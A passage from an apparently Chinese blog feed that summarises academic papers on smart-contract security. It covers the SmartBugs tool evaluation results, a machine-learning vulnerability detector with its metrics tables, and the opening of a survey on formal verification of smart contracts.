Setup</h4><p>我们将时间预算设置为每次分析30分钟。为了为一次执行一项工具而不是一份合约确定合适的时间预算，我们首先在摘要化的数据集上执行了所有工具。<br>然后，我们选择的时间预算要高于平均执行时间（1分44秒）。如果花费了时间预算，我们将停止执行并收集执行的部分结果。在执行实验期间，Manticore是唯一面临超时的工具</p><h4 id="Large-scale-Execution"><a href="#Large-scale-Execution" class="headerlink" title="Large-scale Execution."></a>Large-scale Execution.</h4><p>总共对47,518张合同执行了9种分析工具。这代表了428,337次分析，这些分析大约需要564天和3个小时的组合执行时间，超过一年的连续执行时间。使用了两个云提供商来租用该实验所需的服务器。<br>第一个提供商是Scaleway，我们在其中使用了三台服务器，这些服务器具有32个vCPU和128 GB的RAM。我们增加了500€的预算，并支出了474.99€。</p><p>第二个提供商是Google Cloud，使用了三台服务器和32个 vCPU，30GB RAM。我们在Google Cloud上花费了1038.46€。<br>我们总共花费了1513.45 €（折合11,971.44人民币）来执行本文中讨论的实验。</p><h2 id="四、RESULTS"><a href="#四、RESULTS" class="headerlink" title="四、RESULTS"></a>四、RESULTS</h2><h3 id="Precision-of-the-Analysis-Tools"><a href="#Precision-of-the-Analysis-Tools" class="headerlink" title="Precision of the Analysis Tools"></a>Precision of the Analysis Tools</h3><p>用来该分析工具的精确度的方法如下：</p><ol><li>我们在69个合同上执行了9个工具</li><li>将工具检测到的所有漏洞提取到JSON文件中。 </li><li>我们将检测到的漏洞映射到漏洞类别。</li></ol><p>手动将已检测到的所有漏洞类型注释为十个DASP类别之一。例如，Oyente检测到一个名为Integer Overflow的漏洞，该漏洞已链接到Arithmetic类别；总共确定了141个漏洞类型，其中97个已被标记。不幸的是，发现这9个工具中没有一个能够检测到不良随机性（Bad Randomness）和短地址（Short Addresses）类别的漏洞，工具不会检测某些类别的漏洞，因为它们并非旨在识别所有类型的漏洞。</p><center>TABLE 5 每个工具按类别识别的漏洞 </center><p><img src="https://gitee.com/Reanon/upload-markdown-img/raw/master/img/20201009211425.png" alt="image-20201009211425151"></p><p>括号中显示了单个工具识别的漏洞数量</p><center>TABLE 6 每个工具检测到的漏洞总数 </center><p><img src="https://gitee.com/Reanon/upload-markdown-img/raw/master/img/20201009211556.png" alt="image-20201009211556647"></p><p>回答RQ1：当前的分析工具在检测Solidity智能合约上的漏洞时的准确性如何？</p><p>通过将9个工具组合在一起，它们只能检测到所有漏洞的42％。这表明仍然存在提高智能合约漏洞检测方法的准确性的空间。我们注意到，在以下三个类别中，该工具在检测漏洞方面表现不佳：访问控制（Access Control），拒绝服务（Denial of service）和前端运行（Front running）。<br>它们无法通过设计漏洞来检测不良随机性和短地址类别中的漏洞。此外观察到，Mythril在检测到的漏洞数量（31/115，占27％）和针对的漏洞类别数量（5/9类别）方面胜过其他工具。<br>Mythril和Slither的组合可以检测到总共42/115（37％）的漏洞，这是准确性和执行成本之间的最佳折衷方案。</p><h3 id="Vulnerabilities-in-Production-Smart-Contracts"><a href="#Vulnerabilities-in-Production-Smart-Contracts" class="headerlink" title="Vulnerabilities in Production Smart Contracts"></a>Vulnerabilities in Production Smart Contracts</h3><p>为了研究检测合同中漏洞的能力，分析了9种选定工具从数据集sbwild中查找漏洞。我们采用了与先前研究问题相同的方法，但是，对于$SB^{WILD}$来说，这里没有确定漏洞的预言。</p><p>表7列出了在47,518个合同上执行9个工具的结果。它表明，这9个工具能够检测八种不同类别的漏洞。请注意，HoneyBadger检测到的漏洞是看起来很脆弱但其实并不是漏洞的合同——它们旨在看上去容易受到攻击，以便从试图利用此漏洞的人们那里窃取以太币。总共，44,589份合同(93%)至少有一个漏洞被9种工具中的一种检测到。</p><center>TABLE 7 具有至少一个漏洞的合同总数 </center><p><img src="https://gitee.com/Reanon/upload-markdown-img/raw/master/img/20201009214242.png" alt="image-20201009214242623"></p><p><img src="https://gitee.com/Reanon/upload-markdown-img/raw/master/img/20201009214917.png" alt="image-20201009214917011"></p><center>Figure 1：由一、二、三、四个或四个以上工具（4+）标识的漏洞比例 </center><p>回答RQ2：以太坊区块链中存在多少个漏洞？<br>这9种工具可识别93％的合同中的漏洞，这表明误报率很高。仅Oyente，就能在73％的合同中检测到漏洞。通过组合使用工具来达成共识，观察到只有少数漏洞获得了四个或更多工具的共识：937个Arithmetic漏洞和133个Reentrancy漏洞。</p><h3 id="Execution-Time-of-the-Analysis-Tools"><a href="#Execution-Time-of-the-Analysis-Tools" class="headerlink" title="Execution Time of the Analysis Tools"></a>Execution Time of the Analysis Tools</h3><p>在本节中，我们介绍了分析sbwild数据集47,518所需的工具执行时间。为了衡量执行时间，我们记录了每个分析的开始时间和结束时间。</p><p>单个执行由以下步骤组成:</p><ol><li>启动Docker镜像，将合同绑定到Docker实例;</li><li>清洗Docker容器;</li><li>解析日志并将其输出到results文件夹中。</li></ol><p>表8列出了每种工具使用的平均时间和总时间。平均执行时间是在每个合同上执行该工具，包括编译，构建IR、图形、分析和解析结果。</p><center>Table 8: 每个工具的平均执行时间</center><p><img src="https://gitee.com/Reanon/upload-markdown-img/raw/master/img/20201009215326.png" alt="image-20201009215326143"></p><p>在表中，我们可以观察到三组不同的执行时间：执行需要几秒钟的工具，花费几分钟的工具和花费24分钟的Manticore。 </p><ul><li>Oyente，Osiris，Slither，Smartcheck和Solhint是速度更快的工具，平均需要5到30秒才能分析智能合约。 </li><li>HoneyBadger，Maian，Mythril和Securify的执行速度较慢，执行时间介于1m24到6m37之间。</li><li>最后，Manticore需要24分28秒。</li></ul><p>工具之间执行时间的差异取决于每个工具使用的技术。诸如Smartcheck和Slither之类的纯静态分析工具之所以快速，是因为它们无需编译或执行合同即可识别漏洞和不良做法（bad practices）。</p><p>Securify，Maian，Mythril和Manticore分析合同的EVM字节码。这意味着这些工具需要在进行分析之前编译合同，附加的编译步骤会减慢分析速度。<br>Manticore是所有工具中最慢的，因为该工具一次仅分析一个内部合同（Solidity源文件可以包含任意数量的合同定义）。</p><p>回答RQ3：这些工具需要多长时间来分析智能合约？<br>这些工具平均需要4分31秒来分析一份合同。但是，各工具的执行时间差异很大。<br>Slither是最快的工具，平均只需5秒钟即可分析合同。<br>Manticore是最慢的工具。分析合同平均需要24分28秒。</p><p>我们还注意到执行速度并不是影响工具性能的唯一因素；Securify比Maian花费了更多的时间来执行，但是Securify可以很容易地并行化，因此分析47,518个合同的速度比Maian快得多。最后，并没有观察到准确性和执行时间之间的相关性。</p><h2 id="五、SUMMARY-amp-REVIEW"><a href="#五、SUMMARY-amp-REVIEW" class="headerlink" title="五、SUMMARY &amp; REVIEW"></a>五、SUMMARY &amp; REVIEW</h2><p>本文作者制作了两个很有用的数据集，并将它们公开出来。参考DASP10智能合约漏洞类别作为对漏洞进行分类，发现当前的技术水平无法检测DASP10的两类漏洞：随机性差和短地址。。最后，使用创建的可拓展的执行框架SmartBugs在两个数据集上执行9个自动化分析工具。</p><p>结果表明，所有工具仅检测到注释数据集中的漏洞的42％，其中<a href="https://github.com/ConsenSys/mythril">Mythtil</a>具有更高的准确性（27％），此外本文还提到如果要兼顾准确性和执行成本，那么Mythril和Slither的组合可以检测到总共42/115（37％）的漏洞，这是最佳折衷方案；</p><p>而对另一个数据集进行漏洞检测时，有97％的合同至少被一种工具检测到漏洞，这表明每种工具都可能存在着大量误报，而其中Oyente更是当仁不让地检测到73％的合同中的漏洞。</p><p>此外，本文提出现有的工具的检测能力还有待提高，而其中Mythril是具有较高准确性的工具，并且能够检测到31/115（27％）的漏洞。当对更大的数据集进行漏洞检测时，有97％的合同被确定为易受攻击，这表明存在着大量误报。</p><p>感觉文本作者不足在于，为了使得实验更加方便的进行或许排除了一些更加有用的方法，可能考虑地不是那么全面。</p>]]></content>
    
    
    <categories>
      
      <category>智能合约</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Smart Contract</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Machine Learning Model for Smart Contracts Security Analysis</title>
    <link href="/2020/0978ff8e8d.html"/>
    <url>/2020/0978ff8e8d.html</url>
    
    <content type="html"><![CDATA[<h1 id="Machine-Learning-Model-for-Smart-Contracts-Security-Analysis"><a href="#Machine-Learning-Model-for-Smart-Contracts-Security-Analysis" class="headerlink" title="Machine Learning Model for Smart Contracts Security Analysis"></a>Machine Learning Model for Smart Contracts Security Analysis</h1><p>论文标题：(2019-PST) <a href="https://ieeexplore.ieee.org/document/8949045">Machine Learning Model for Smart Contracts Security Analysis</a>——智能合约安全性分析的机器学习模型</p><p>论文引用：Momeni P, Wang Y, Samavi R. Machine Learning Model for Smart Contracts Security Analysis[C]//2019 17th International Conference on Privacy, Security and Trust (PST). IEEE, 2019: 1-6.</p><p>代码开源：<strong>本文代码并未开源</strong>。</p><p>本文发表于<a href="https://pstnet.ca/pst2019/">2019 17th International Conference on Privacy, Security and Trust (PST)</a>，三名作者都是来自加拿大的<a href="https://www.mcmaster.ca/">麦克马斯特大学</a>。</p><h2 id="一、主要内容"><a href="#一、主要内容" class="headerlink" title="一、主要内容"></a>一、主要内容</h2><p>本文介绍了一种机器学习的预测模型（machine learning predictive model ）用以检测智能合约中的漏洞。作者采用了<a href="https://github.com/crytic/slither">Slither</a>和<a href="https://github.com/ConsenSys/mythril">Mythril</a>两个静态代码分析器【都已在GitHub上开源】（static code analyzers）来标记1000多个已在以太坊平台上验证并使用的智能合约，然后提取合约中的46种漏洞，对每一种漏洞都采用五重交叉验证（five-fold cross validation）进行建模。使用模型预测了16种类型的漏洞，平均准确度为95％，F1score为79％。</p><h2 id="二、智能合约静态代码分析"><a href="#二、智能合约静态代码分析" class="headerlink" title="二、智能合约静态代码分析"></a>二、智能合约静态代码分析</h2><p>静态代码分析器无需执行程序即可在计算机软件中搜索bug。静态代码分析有两种：分析源代码和分析目标代码。</p><h3 id="智能合约安全挑战"><a href="#智能合约安全挑战" class="headerlink" title="智能合约安全挑战"></a>智能合约安全挑战</h3><ol><li>将智能合约上传到区块链后，任何其他合约或用户都可以调用该合约。这会生成无法在合同的未经测试的执行路径上执行的输入的不可预测的组合。</li><li>因为合约的二进制代码及其状态存储在区块链的不变账本中，智能合约无法修补，如果安全问题严重，则平台管理员可以用分叉来更改或删除分类帐，但是分叉代价极大。</li></ol><p>Solidity源代码中提取了抽象语法树（AST）作为程序的中间表示形式，因为AST提供了有关程序代码的信息，这些信息可用作查找漏洞的特征。</p><h3 id="抽象语法树（AST）"><a href="#抽象语法树（AST）" class="headerlink" title="抽象语法树（AST）"></a>抽象语法树（AST）</h3><p>AST在编译器中广泛使用的代表程序代码结构的数据结构。 AST中的每个节点代表一种编程语言的语法元素，树显示了这些元素的使用顺序。静态代码分析器支持AST，因为AST提供了有关源代码特征的丰富详细信息，例如函数定义或其他合同中的合同的数量。使用<code>Solc</code>（Solidity命令行编译器）从Solidity代码生成AST。</p><h3 id="控制流程图（CFG）"><a href="#控制流程图（CFG）" class="headerlink" title="控制流程图（CFG）"></a>控制流程图（CFG）</h3><p>CFG表示程序可以表示采取的所有执行路径。可以从AST提取CFG，在AST编译器使用CFG的目的是从程序的语句生成汇编代码。 CFG还常用于静态代码分析工具中，以在程序中定位无法访问的代码。</p><h3 id="静态代码分析"><a href="#静态代码分析" class="headerlink" title="静态代码分析"></a>静态代码分析</h3><p>为了运行静态分析器，需要首先通过词法分析器（lexer tools）工具解析源代码。然后，从解析的代码生成抽象语法树（AST），并从AST中提取控制流图（CFG）。通过执行这些步骤，静态代码分析器能够检查通过CFG的所有执行路径是否存在潜在的错误。静态代码分析器根据不同类型的漏洞执行不同的分析，例如符号执行和污点分析。</p><h2 id="三、基于机器学习的智能合约代码分析"><a href="#三、基于机器学习的智能合约代码分析" class="headerlink" title="三、基于机器学习的智能合约代码分析"></a>三、基于机器学习的智能合约代码分析</h2><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20210412113202.png" alt="基于机器学习的代码分析器概述"></p><center>图1 基于机器学习的代码分析器概述</center><h3 id="数据收集与预处理"><a href="#数据收集与预处理" class="headerlink" title="数据收集与预处理"></a>数据收集与预处理</h3><p>数据集是从Etherscan 收集的，我们总共收集了以Solidity编写的13,745个唯一的活动智能合约源代码。由于Solidity编译器的版本4不向后兼容，因此专注于数据集中版本为0.4.18的智能合约，合格智能合约的数量减少到1,013。将数据集分为80％训练和20％测试集。</p><h3 id="建立AST和特征提取"><a href="#建立AST和特征提取" class="headerlink" title="建立AST和特征提取"></a>建立AST和特征提取</h3><p>从数据集中，我们从AST中提取了17个特征，如表I所示。这些特征是常见的Solidity代码结构，在我们的数据集中出现了1000多次。这些功能代表了代码的复杂性，可以分为两类：</p><ol><li>代表执行路径（例如，函数调用）并直接添加到控制流程图的特征；</li><li>代表启发式猜测（heuristic guesses）的其他功能代码的复杂性，例如代码行（LOC）。</li></ol><center>表1 AST中提取的特征</center><table><thead><tr><th>Feature Name</th><th></th></tr></thead><tbody><tr><td>1 Lines of code  (LOC)</td><td>10 Bytes</td></tr><tr><td>2 Contract  definitions</td><td>11 Elementary  type addresses</td></tr><tr><td>3 Function  definitions</td><td>12 Modifier  definitions</td></tr><tr><td>5 Binary  operations</td><td>13 Placeholder  statements</td></tr><tr><td>6 Function  calls</td><td>14 Modifier  invocation</td></tr><tr><td>7 Blocks</td><td>15 Approve  function definitions</td></tr><tr><td>8 Expression  statements</td><td>16 Constant  values</td></tr><tr><td>9 Event  definitions</td><td>17 Hexadecimal  addresses</td></tr></tbody></table><h3 id="静态代码分析-1"><a href="#静态代码分析-1" class="headerlink" title="静态代码分析"></a>静态代码分析</h3><p>使用了两个智能合约静态代码分析器Mythril 和Slither。这两个工具在区块链社区中具有很高的影响力和声誉。Mythril Classic：此分析器使用多种技术（例如符号执行和污点分析）来检测Solidity代码中的安全漏洞。Mythril可以检测19种类型的漏洞。如表II所示，在这19个漏洞中，我们的数据集中发现了11个漏洞。</p><p>Slither：此分析器使用污点分析来跟踪Solidity代码分析中的值，并且可以找到31种类型的漏洞，它们具有四个不同的影响级别（高，中，低和信息性）。在我们的数据集中，这31种类型的漏洞中有30种存在。在静态代码分析中使用两个不同的分析器时，我们遇到的挑战之一是两个分析器之间的句法和语义上的差异。</p><center>表2 静态代码分析器检测到的安全漏洞</center><table><thead><tr><th>Code</th><th>Security  Problem</th><th>Mythril</th><th>Slither</th></tr></thead><tbody><tr><td>1</td><td>Integer  underﬂow</td><td>x</td><td></td></tr><tr><td>2</td><td>Re-entrancy  vulnerability with balance change</td><td></td><td>x</td></tr><tr><td>3</td><td>Unprotected  usage of <em>selfdestruct</em></td><td>x</td><td>x</td></tr><tr><td>4</td><td>Contracts  that lock ether</td><td></td><td>x</td></tr><tr><td>5</td><td>Incorrect  ERC20 interface</td><td></td><td>x</td></tr><tr><td>6</td><td>Multiple  calls in a single transaction</td><td>x</td><td></td></tr><tr><td>7</td><td>Re-entrancy  vulnerability without balance change</td><td></td><td>x</td></tr><tr><td>8</td><td>Unprotected  usage of <em>tx.origin</em></td><td>x</td><td>x</td></tr><tr><td>9</td><td>Unused  return</td><td></td><td>x</td></tr><tr><td>10</td><td>Usage  of low level calls</td><td>x</td><td>x</td></tr><tr><td>11</td><td>Exception  state</td><td>x</td><td></td></tr><tr><td>12</td><td>Local  variable shadowing</td><td></td><td>x</td></tr><tr><td>13</td><td>Assembly  usage</td><td></td><td>x</td></tr><tr><td>14</td><td>State  variables that could be declared as constant</td><td></td><td>x</td></tr><tr><td>15</td><td>Unindexed  ERC20 event parameters</td><td></td><td>x</td></tr><tr><td>16</td><td>Usage  of complex pragma statement</td><td></td><td>x</td></tr><tr><td>17</td><td>Built-in  symbol shadowing</td><td></td><td>x</td></tr><tr><td>18</td><td>Calls  inside a loop</td><td></td><td>x</td></tr><tr><td>19</td><td>Conformance  to solidity naming conventions</td><td></td><td>x</td></tr><tr><td>20</td><td>Constant  functions changing the state</td><td></td><td>x</td></tr><tr><td>21</td><td>Dangerous  strict equalities</td><td></td><td>x</td></tr><tr><td>22</td><td>Delegate  a proxy call</td><td>x</td><td>x</td></tr><tr><td>23</td><td>External  call to a ﬁxed address</td><td>x</td><td></td></tr><tr><td>24</td><td>Functions  that send ether to arbitrary destinations</td><td></td><td>x</td></tr><tr><td>25</td><td>Integer  overﬂow</td><td>x</td><td></td></tr><tr><td>26</td><td>Re-entrancy-vulnerability  in general</td><td></td><td>x</td></tr><tr><td>27</td><td>State  variable shadowing</td><td></td><td>x</td></tr><tr><td>28</td><td>State  variable shadowing from abstract contracts</td><td></td><td>x</td></tr><tr><td>29</td><td>Uninitialized  local variables</td><td></td><td>x</td></tr><tr><td>30</td><td>Uninitialized  state variables</td><td></td><td>x</td></tr><tr><td>31</td><td>Unused  state variables</td><td></td><td>x</td></tr><tr><td>32</td><td>Uninitialized  storage variables</td><td></td><td>x</td></tr><tr><td>33</td><td>Unprotected  ether withdrawal</td><td>x</td><td></td></tr><tr><td>34</td><td>Usage  of deprecated standards</td><td></td><td>x</td></tr><tr><td>35</td><td>Usage  of different solidity versions</td><td></td><td>x</td></tr></tbody></table><h3 id="标记Labeling"><a href="#标记Labeling" class="headerlink" title="标记Labeling"></a>标记Labeling</h3><p>在此步骤中，使用先前静态代码分析器提取的36种漏洞被用来标记智能合约。如果静态代码分析器检测到漏洞，则我们将该漏洞标记为存在，否则标记为不存在。为了捕获差异，创建了五个新的安全漏洞，作为两个分析器检测到的安全漏洞的组合值。当任一分析工具报告存在该漏洞时，我们将组合值标记为存在；否则，我们将其标记为不存在。</p><h3 id="分类Classification"><a href="#分类Classification" class="headerlink" title="分类Classification"></a>分类Classification</h3><p>选择了四个常用的监督二元分类器：支持向量机（Support Vector Machine，SVM），神经网络（Neural Network，NN），随机森林（Random Forest，RF）和决策树（Decision Tree，DT）来训练模型。由于安全漏洞彼此独立，因此分别为每个漏洞训练了二进制分类器，总共训练了184（4 * 46）个二元分类器。</p><h2 id="四、结果和讨论"><a href="#四、结果和讨论" class="headerlink" title="四、结果和讨论"></a>四、结果和讨论</h2><h3 id="评估指标"><a href="#评估指标" class="headerlink" title="评估指标"></a>评估指标</h3><ol><li><p>首先定义以下几个概念</p><ol><li>$TP$（True Positive）真阳性：预测为正，实际也为正</li><li>$FP$（False Positive）假阳性：预测为正，实际为负</li><li>$FN$（False Negative）假阴性：预测与负、实际为正</li><li>$TN$（True Negative）真阴性：预测为负、实际也为负</li></ol></li><li><p>通过第一步的统计值计算每个类别下的precision和recall</p><ol><li>精准度 / 查准率($precision_k=\frac{TP}{TP+FP}$)：指被分类器判定正例中的正样本的比重</li><li>召回率 / 查全率 ($recall_k=\frac{TP}{TP+FN}$)：指的是被预测为正例的占总的正例的比重</li><li>准确率($accuracy=\frac{TP+TN}{TP+FN+TN+FP}$)：代表分类器对整个样本判断正确的比重</li></ol></li><li><p>计算结果计算每个类别下的<code>F1-score</code>，计算方式如下</p><ol><li>$F1_{k}=2\times \frac{precision_k·recall_k}{precision_k+recall_k}$</li></ol></li><li><p>通过对第三步求得的各个类别下的<code>F1-score</code>求均值，得到最后的评测结果，计算方式如下</p><ol><li>$score=\frac{1}{n}\sum F1_k$</li></ol></li></ol><h3 id="评价结果"><a href="#评价结果" class="headerlink" title="评价结果"></a>评价结果</h3><p>我们在表III中报告了实验结果。在此表的每一行中，我们列出了一个漏洞和基于上述指标产生最佳结果的机器学习算法。例如，Integer下溢由决策树算法识别，F1分数为86％，准确性为99％，准确性为100％，召回率为75％。模型在发现漏洞方面的合理准确性和精确度表明了利用机器学习在智能合约中查找安全漏洞的可能性。根据我们模型的结果，我们得出以下结论。</p><center>表3 安全漏洞检测的准确性</center><table><thead><tr><th>Code</th><th>Security  Problem</th><th>Severity</th><th>Method</th><th>TN</th><th>FP</th><th>FN</th><th>TP</th><th>F1</th><th>Accuracy</th><th>Precision</th><th>Recall</th></tr></thead><tbody><tr><td>1</td><td>Integer  underﬂow</td><td>High</td><td>SVM</td><td>163</td><td>0</td><td>1</td><td>3</td><td>86%</td><td>99%</td><td>100%</td><td>75%</td></tr><tr><td>2</td><td>Re-entrancy  vulnerability with balance change</td><td>High</td><td>NN</td><td>129</td><td>10</td><td>6</td><td>22</td><td>73%</td><td>90%</td><td>69%</td><td>79%</td></tr><tr><td>3</td><td>Unprotected  usage of <em>selfdestruct</em></td><td>High</td><td>DT</td><td>166</td><td>0</td><td>0</td><td>1</td><td>100%</td><td>100%</td><td>100%</td><td>100%</td></tr><tr><td>4</td><td>Contracts  that lock ether</td><td>Medium</td><td>RF</td><td>130</td><td>0</td><td>6</td><td>31</td><td>91%</td><td>96%</td><td>100%</td><td>84%</td></tr><tr><td>5</td><td>Incorrect  ERC20 interface</td><td>Medium</td><td>SVM</td><td>133</td><td>12</td><td>4</td><td>18</td><td>69%</td><td>90%</td><td>60%</td><td>82%</td></tr><tr><td>6</td><td>Multiple  calls in a single transaction</td><td>Medium</td><td>DT</td><td>159</td><td>2</td><td>2</td><td>4</td><td>67%</td><td>98%</td><td>67%</td><td>67%</td></tr><tr><td>7</td><td>Re-entrancy  vulnerability without balance change</td><td>Medium</td><td>DT</td><td>144</td><td>5</td><td>7</td><td>11</td><td>65%</td><td>93%</td><td>69%</td><td>61%</td></tr><tr><td>8</td><td>Unprotected  usage of <em>tx.origin</em></td><td>Medium</td><td>SVM</td><td>166</td><td>0</td><td>0</td><td>1</td><td>100%</td><td>100%</td><td>100%</td><td>100%</td></tr><tr><td>9</td><td>Unused  return</td><td>Medium</td><td>DT</td><td>128</td><td>11</td><td>6</td><td>22</td><td>72%</td><td>90%</td><td>67%</td><td>79%</td></tr><tr><td>10</td><td>Usage  of low level calls</td><td>Medium</td><td>DT</td><td>164</td><td>1</td><td>0</td><td>2</td><td>80%</td><td>99%</td><td>67%</td><td>100%</td></tr><tr><td>11</td><td>Exception  state</td><td>Low</td><td>SVM</td><td>128</td><td>6</td><td>13</td><td>20</td><td>68%</td><td>89%</td><td>77%</td><td>61%</td></tr><tr><td>12</td><td>Local  variable shadowing</td><td>Low</td><td>SVM</td><td>144</td><td>7</td><td>5</td><td>11</td><td>65%</td><td>93%</td><td>61%</td><td>69%</td></tr><tr><td>13</td><td>Assembly  usage</td><td>Informational</td><td>NN</td><td>152</td><td>4</td><td>1</td><td>10</td><td>80%</td><td>97%</td><td>71%</td><td>91%</td></tr><tr><td>14</td><td>State  variables that could be declared as constant</td><td>Informational</td><td>SVM</td><td>70</td><td>28</td><td>17</td><td>52</td><td>70%</td><td>73%</td><td>65%</td><td>75%</td></tr><tr><td>15</td><td>Unindexed  ERC20 event parameters</td><td>Informational</td><td>NN</td><td>164</td><td>0</td><td>1</td><td>2</td><td>80%</td><td>99%</td><td>100%</td><td>67%</td></tr><tr><td>16</td><td>Usage  of complex pragma statement</td><td>Informational</td><td>SVM</td><td>165</td><td>0</td><td>0</td><td>2</td><td>100%</td><td>100%</td><td>100%</td><td>100%</td></tr></tbody></table><h2 id="五、总结与评价"><a href="#五、总结与评价" class="headerlink" title="五、总结与评价"></a>五、总结与评价</h2><p> 本篇论文对我蛮有启发的，其提出了一个很中肯的方案将机器学习的方法与智能合约结合起来。心理预想了一遍，感觉实现过程比较清晰：</p><ol><li>从Etherscan上爬取合约，然后通过一些限制条件去除大部分智能合约。</li><li>对这些智能合约使用开源的<a href="https://github.com/crytic/slither">Slither</a>和<a href="https://github.com/ConsenSys/mythril">Mythril</a>两个静态代码分析器检测是否存在漏洞。</li><li><code>Solc</code>（Solidity命令行编译器）从Solidity代码生成AST，然后从AST中提取特征，不过本文中并没有详细提到如何提取特征，只是提到了哪些特征。</li><li>再使用几种机器学习的方法进行建模，这里本中并没有详细提及如何建模：比如输入的特征是什么，怎么输入，输出是什么。只是把抄了一遍方法的最基本定义，不禁让人怀疑本文是如何做的。</li><li>其文中结论部分，精挑细选了一些结果，有些穿凿附会。</li></ol>]]></content>
    
    
    <categories>
      
      <category>智能合约</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Smart Contract</tag>
      
      <tag>机器学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>A Survey of Smart Contract Formal Specification and Verification</title>
    <link href="/2020/09782d0fb0.html"/>
    <url>/2020/09782d0fb0.html</url>
    
    <content type="html"><![CDATA[<h1 id="A-Survey-of-Smart-Contract-Formal-Specification-and-Verification"><a href="#A-Survey-of-Smart-Contract-Formal-Specification-and-Verification" class="headerlink" title="A Survey of Smart Contract Formal Specification and Verification"></a>A Survey of Smart Contract Formal Specification and Verification</h1><p>论文标题：<a href="https://arxiv.org/abs/2008.02712">A Survey of Smart Contract Formal Specification and Verification</a> —— 智能合约正式规范和验证调查</p><p>论文引用：Tolmach P, Li Y, Lin S W, et al. A Survey of Smart Contract Formal Specification and Verification[J]. arXiv preprint arXiv:2008.02712, 2020.</p><h2 id="一、主要内容"><a href="#一、主要内容" class="headerlink" title="一、主要内容"></a>一、主要内容</h2><p>智能合约是一种计算机程序，可让用户在区块链平台之上自动定义和执行交易。鉴于智能合约对于支持整个行业部门（包括供应链，金融，法律和医疗服务）的重要活动的重要性，因此对验证和确认技术有强烈的需求。但是，绝大多数智能合约都缺乏任何形式的规范，这对于确定其正确性至关重要。</p><p>在这项调查中，本文调查了文献中介绍的智能合约的正式模型和规格，并提供了系统概述以了解常见趋势，还讨论用于验证此类属性规范的当前方法并找出差距，以期识别出未来工作的有希望的方向。</p><h3 id="三个问题"><a href="#三个问题" class="headerlink" title="三个问题"></a>三个问题</h3><p>RQ1: 什么是用于智能合约的建模、规范和验证的“形式化技术”？这些技术指定并验证了哪些“常见的形式化的要求”？</p><p>1、在合约级别的表示中，最主要的组合是时态逻辑中的状态转换模型（state-transition models）和规范，然后由模型检验器（model checker）进行验证。如表所示，这种组合主要用于描述功能正确性属性，一些涉及进度概念（the concept of progress）的安全属性，如流动性（liquidity ），被建模为活跃性。</p><p>2、Hoare-style规范进行自动化程序级验证(automated program-level),字节码级定义的程序逻辑允许使用定理证明器来推理智能合约行为，而源代码级注释通常由程序验证技术来执行。安全属性的验证主要由现有的已建立的符号执行和程序验证工具链(如Boogie)主导。</p><p>3、Runtime verification check，运行时验证检查类似问题，但在运行时执行跟踪。这些技术通常需要使用适当的监视器(例如断言)来检测智能契约代码。运行时监视（Runtime monitoring）也可以通过跟踪事件来实现，以便对托管和供应链应用程序进行合规性检查。</p><p>RQ2: 智能合约和区块链环境在规范和验证智能合约方面带来了哪些“挑战”。</p><p>Pattern-Based Verification 基于模式的验证。智能合约安全性分析主要在程序级别执行。这些技术通常依赖于专家定义的易受攻击的模式，这将这些工具限于识别一组已知的漏洞。通过关注漏洞的根本原因（例如不确定性因素对智能合约执行的影响），可以实现对更大类别漏洞的泛化。为了扩展可检测到的漏洞列表，一些工作提出了规范语言，允许用户以不变式的形式定义漏洞，时间属性（temporal properties）或用要求注释Solidity合同。</p><p>时间属性的有限验证。</p><p>执行环境建模中的复杂性</p><p>RQ3: What are <strong>the current limitations</strong> in smart contract formal specification and verification and what research directions may be taken to overcome them?</p><p>智能合约正式规范和验证中的“当前限制”是什么？可以采取哪些研究方向来克服这些限制？</p><h2 id="二、MODELING-FORMALISM-建模方法"><a href="#二、MODELING-FORMALISM-建模方法" class="headerlink" title="二、MODELING FORMALISM 建模方法"></a>二、MODELING FORMALISM 建模方法</h2><p>在不同的抽象级别定义模型。<strong>合同级方法</strong>与所分析的智能合同的高级行为有关，通常不考虑其实施和执行的技术细节。<strong>程序级方法</strong>主要对合同实现（即源代码）本身进行分析，因此依赖于平台。</p><h3 id="Contract-level-models-合同级模型"><a href="#Contract-level-models-合同级模型" class="headerlink" title="Contract-level models(合同级模型)"></a>Contract-level models(合同级模型)</h3><p>在合同级别的分析中，智能合同被视为黑匣子（black boxes），它们接受来自外部的交易消息，并可能基于这些消息执行一些计算。合同级模型涉及以下概念：</p><ol><li>Users：可以是与智能合约互动的任何类型的账户（包括余额、交易信息以及如账户地址和附加值的相关参数等。）</li><li>Contracts：一组可公开访问的函数以及函数能执行的外部可见效果（比如合同所有者/余额的变化、发出的事件/操作）</li><li>Blockchain State：合同所指的全局变量和环境变量，例如时间戳和块编号。区块链状态可能还包括矿池和合同执行环境的内存状态。</li></ol><p>合同级模型可以有效地表达有关智能合同与外部环境之间的交互的属性，并且通常根据进程代数（Process Algebras），状态转换系统（State-Transition Systems）和基于集合的方法（Set-Based Methods）来定义它们。</p><h4 id="进程代数（Process-Algebras）"><a href="#进程代数（Process-Algebras）" class="headerlink" title="进程代数（Process Algebras）"></a>进程代数（Process Algebras）</h4><p>进程代数是一类数学方法，用于以交互并发流程（interacting concurrent processes）的形式描述分布式或并行系统（distributed or parallel systems）的行为。</p><p>智能合约的可观察到的行为类似于共享内存并发程序（shared-memory concurrent program）或具有交错模式（interleaving mode）的系统的行为，这使进程代数成为高级行为建模成为可能。因此，进程代数捕获并发用户与智能合约之间的交互。对于这些交互，可以通过将智能合约转换为进程代数形式主义之一来确保正确性。一种替代方法涉及以进程代数领域专用语言（process-algebraic domainspecific language，DSL）实现智能合约。</p><p>假定用户通过调用以太坊合约的public 函数与以太坊合约互动，Qu等人和Li等将Solidity 函数 转化为分别在通信顺序过程（Communicating Sequential Processes，CSP）和所应用的π演算SAPIC（π-calculus SAPIC）的变体中定义的过程符号。<br>如果交易不是原子的，则不同用户调用的函数之间的相互作用可能会导致风险状况，这些风险状况通过执行轨迹中出现的易受攻击的序列来体现。</p><p>在合同中，每个用户都可以提出自己的出价，直到达到截止日期为止。拍卖结束后，最高出价将转给受益人，而失败的投标者可以撤回其投标。或者，可以在投标阶段取消拍卖。由于用户通过调用智能合约的功能来参与拍卖，因此图3显示了Solidity实现的两个功能，即bid（）和finish（）。</p><p><img src="https://gitee.com/Reanon/upload-markdown-img/raw/master/img/20200908192601.png" alt="image-20200908192601798">`</p><p>Fig. 3. 